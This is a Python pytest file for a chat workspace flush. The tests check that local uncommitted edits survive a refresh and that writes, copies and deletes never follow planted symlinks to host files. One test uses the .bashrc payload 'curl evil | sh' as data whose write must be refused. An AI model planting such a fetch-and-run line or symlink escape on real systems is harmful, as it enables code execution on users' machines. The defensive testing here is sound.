"""Chat workspace refresh preserves local edits and rejects unsafe paths.

Accepted SQL revisions supply current files. The hydrated checkpoint and the
run's acknowledged commits define what the workspace last received.
"""
from __future__ import annotations

import asyncio
import os
import uuid

import pytest

from database import get_db_connection

CHANNEL = str(uuid.uuid5(uuid.NAMESPACE_URL, "tests:chat-flush:channel"))


@pytest.fixture
def client(api_app):
    from fastapi.testclient import TestClient
    from models import Channel
    from state import state
    with TestClient(api_app) as http:
        channel = Channel(id=uuid.UUID(CHANNEL), name="Starting")
        from genesis import ensure_capabilities_stack
        ensure_capabilities_stack(channel)
        state.channels = [channel]
        state.active_channel_id = channel.id
        get_db_connection(str(channel.id)).close()
        http.channel_id = CHANNEL
        yield http



@pytest.fixture
def cell(client):
    """A fresh canvas cell id."""
    return client.post(f"/api/stacks/{CHANNEL}/create").json()["main_stacks"][-1]["cells"][0]["id"]


def _seed_run_row(run_id: str) -> None:
    conn = get_db_connection(CHANNEL)
    try:
        conn.execute("INSERT INTO runs (id, prompt, status) VALUES (?, 'x', 'running')", (run_id,))
        conn.commit()
    finally:
        conn.close()


def _tip(cell_id: str) -> str:
    from versions import find_tip
    conn = get_db_connection(CHANNEL)
    try:
        return find_tip(conn, cell_id)
    finally:
        conn.close()


def _mem(path: str, text: str) -> dict:
    return {"type": "memory", "cell_path": path, "content": text}


@pytest.fixture
def runs(tmp_path, monkeypatch):
    """``start(cell)``: a registered run on ``cell`` whose workspace is
    hydrated from the cell's current tip, as a run start does."""
    from process_manager import ProcessManager
    import run_registry as registry
    from run_staging import hydrate_workspace
    from runner_permissions import UNRESTRICTED

    live: dict = {}
    monkeypatch.setattr(registry, "active_managers", live)

    def start(cell_id: str):
        rid = str(uuid.uuid4())
        _seed_run_row(rid)
        ws = tmp_path / f"ws-{rid[:8]}"
        ws.mkdir()
        from cell_files import checkpoint_cells
        checkpoint_cells(CHANNEL, [cell_id], 'hydrate')
        tip = _tip(cell_id)
        hydrate_workspace(CHANNEL, cell_id, str(ws), tip_id=tip)
        mgr = ProcessManager(
            channel=CHANNEL, run_id=rid, app_dir=str(ws), workspace_dir=str(ws),
            entrypoint="x.py", generator_name="synth", cell_id=cell_id,
            runner_id="synth", runner_name="Synth", permissions=UNRESTRICTED,
            input_tip_id=tip,
        )
        mgr._ipc_writer = None
        mgr.ui_files = (".json", ".txt")
        live[rid] = mgr
        return mgr

    return start


def _put_current(cell_id: str, path: str, text: str | None, blob: str | None = None) -> None:
    from persistence import current_file, mutate_files
    conn = get_db_connection(CHANNEL)
    try:
        current = current_file(conn, cell_id, path)
    finally:
        conn.close()
    mutation = dict(path=path, writer_id='host:chat-fixture',
                    edit_seq=(current['revision'] + 1 if current else 1),
                    base_revision=current['revision'] if current else 0,
                    kind='delete' if text is None and blob is None else 'put')
    if blob is not None:
        mutation.update(blob_hash=blob, encoding='binary')
    elif text is not None:
        mutation['content_text'] = text
    result = mutate_files(CHANNEL, cell_id, dict(operation_id=str(uuid.uuid4()), mutations=[mutation]), actor='host')
    assert result['outcome'] == 'accepted'


def _operation(mgr, artifacts):
    from persistence import snapshot_files
    conn = get_db_connection(CHANNEL)
    try:
        revisions = {f['path']: f['file_revision'] for f in snapshot_files(conn, mgr.cell_id, include_deleted=True)}
    finally:
        conn.close()
    mgr._test_sequence = getattr(mgr, '_test_sequence', 0) + 1
    return dict(operation_id=str(uuid.uuid4()), writer_id='run:' + mgr.run_id,
                edit_seq=mgr._test_sequence, base_revisions={a['cell_path']: revisions.get(a['cell_path'], 0) for a in artifacts})


def _emit(mgr, artifacts):
    result = mgr._emit_partial(artifacts=artifacts, **_operation(mgr, artifacts))
    assert mgr._last_file_receipt['outcome'] == 'accepted'
    return result


def _store(data: bytes) -> str:
    from cas import hash_and_store_bytes
    return hash_and_store_bytes(data)


def _refusals(mgr) -> list:
    return [e["payload"] for e in mgr.log_buffer if "[chat flush] refused" in str(e.get("payload"))]


def _commit_own(mgr, *artifacts) -> None:
    """The run's own commit, through the ``update_cell`` op its SDK sends."""
    async def _ack(body, _request):
        assert body['ok'], body
        assert body['outcome'] == 'accepted', body
    mgr._send_ack = _ack
    asyncio.run(mgr._op_update_cell({"artifacts": list(artifacts), **_operation(mgr, artifacts)}))


# ---------------------------------------------------------------------------
# F0111: the tip layer never reverts a write the run has not committed
# ---------------------------------------------------------------------------

def test_tip_layer_keeps_an_uncommitted_workspace_write__F0111_F0121(cell, runs):
    """A chat turn wrote its transcript into the workspace and has not
    committed it yet (``turn.append`` stages; nothing forces a commit before
    ``turn_end``). The next message's flush must not copy the committed
    transcript back over it: the next turn reseeds from that file."""
    other = runs(cell)
    _emit(other, artifacts=[_mem("chat/main.json", "[]")])
    run = runs(cell)
    ws = run.workspace_dir
    assert open(os.path.join(ws, "chat/main.json")).read() == "[]"

    with open(os.path.join(ws, "chat/main.json"), "w") as fh:
        fh.write('[{"role": "user", "content": "hi"}]')
    run._flush_chat_files_to_workspace(include_tip=True)

    assert open(os.path.join(ws, "chat/main.json")).read() == '[{"role": "user", "content": "hi"}]'


def test_tip_layer_delivers_what_someone_else_committed__F0111(cell, runs):
    """The positive half: a file another author committed after the run
    started — a new file and a change to one the run hydrated — reaches the
    workspace on the next flush."""
    other = runs(cell)
    _emit(other, artifacts=[_mem("notes.md", "v0")])
    run = runs(cell)
    _emit(other, artifacts=[_mem("notes.md", "v1"), _mem("added.md", "new")])

    run._flush_chat_files_to_workspace(include_tip=True)

    ws = run.workspace_dir
    assert open(os.path.join(ws, "notes.md")).read() == "v1"
    assert open(os.path.join(ws, "added.md")).read() == "new"


def test_tip_layer_keeps_a_write_made_after_the_runs_own_commit__F0111(cell, runs):
    """The run committed ``notes.md`` then rewrote it locally; someone else
    committed an unrelated file meanwhile. The flush delivers the other file
    and leaves the run's newer ``notes.md`` alone: the tip's copy is the
    run's own earlier commit, not news."""
    other = runs(cell)
    run = runs(cell)
    ws = run.workspace_dir
    with open(os.path.join(ws, "notes.md"), "w") as fh:
        fh.write("v1")
    _commit_own(run, _mem("notes.md", "v1"))
    _emit(other, artifacts=[_mem("other.md", "theirs")])
    with open(os.path.join(ws, "notes.md"), "w") as fh:
        fh.write("v2 uncommitted")

    run._flush_chat_files_to_workspace(include_tip=True)

    assert open(os.path.join(ws, "notes.md")).read() == "v2 uncommitted"
    assert open(os.path.join(ws, "other.md")).read() == "theirs"


def test_a_delivered_revision_does_not_replace_later_local_edits(cell, runs):
    """Repeating an accepted snapshot keeps a subsequent local edit."""
    run = runs(cell)
    ws = run.workspace_dir
    _put_current(cell, "plan.md", "user's plan")
    run._flush_chat_files_to_workspace(include_tip=True)
    assert open(os.path.join(ws, "plan.md")).read() == "user's plan"

    with open(os.path.join(ws, "plan.md"), "w") as fh:
        fh.write("the run's revision")
    run._flush_chat_files_to_workspace(include_tip=True)

    assert open(os.path.join(ws, "plan.md")).read() == "the run's revision"


# ---------------------------------------------------------------------------
# F0089: no host write, copy or delete follows a symlink out of the workspace
# ---------------------------------------------------------------------------

@pytest.fixture
def outside(tmp_path):
    """A host directory outside every workspace, holding a file the user owns."""
    d = tmp_path / "outside"
    d.mkdir()
    (d / "victim").write_text("keep me")
    return d


def test_tip_copy_never_writes_through_a_planted_file_link__F0089(cell, runs, outside):
    other = runs(cell)
    run = runs(cell)
    os.symlink(outside / "victim", os.path.join(run.workspace_dir, "evil.txt"))
    _emit(other, artifacts=[_mem("evil.txt", "overwritten")])

    run._flush_chat_files_to_workspace(include_tip=True)

    assert (outside / "victim").read_text() == "keep me"
    assert any("evil.txt" in r for r in _refusals(run))


def test_current_writes_never_follow_a_planted_directory_link(cell, runs, outside):
    """Text and binary paths under a symlink are refused; safe paths proceed."""
    run = runs(cell)
    os.symlink(outside, os.path.join(run.workspace_dir, "sub"))
    _put_current(cell, "sub/.bashrc", "curl evil | sh")
    _put_current(cell, "sub/victim", None, blob=_store(b"\x00binary"))
    _put_current(cell, "fine.md", "lands")

    run._flush_chat_files_to_workspace(include_tip=True)

    assert not (outside / ".bashrc").exists()
    assert (outside / "victim").read_text() == "keep me"
    assert open(os.path.join(run.workspace_dir, "fine.md")).read() == "lands"
    refused = _refusals(run)
    assert any("sub/.bashrc" in r for r in refused)
    assert any("sub/victim" in r for r in refused)


def test_tombstone_never_deletes_through_a_planted_directory_link__F0089(cell, runs, outside):
    """A Files-tab delete of ``sub/victim`` removes the workspace entry only;
    with ``sub`` a link to a host directory there is no workspace entry, and
    the host file the link reaches survives."""
    run = runs(cell)
    os.symlink(outside, os.path.join(run.workspace_dir, "sub"))
    _put_current(cell, "sub/victim", None)

    run._flush_chat_files_to_workspace(include_tip=True)

    assert (outside / "victim").read_text() == "keep me"


def test_tombstone_refuses_a_replaced_workspace_entry_without_following_it(cell, runs, outside):
    _put_current(cell, "gone.txt", "original")
    run = runs(cell)
    link = os.path.join(run.workspace_dir, "gone.txt")
    os.unlink(link)
    os.symlink(outside / "victim", link)
    _put_current(cell, "gone.txt", None)

    run._flush_chat_files_to_workspace(include_tip=True)

    assert os.path.islink(link)
    assert any('gone.txt' in entry for entry in _refusals(run))
    assert (outside / "victim").read_text() == "keep me"
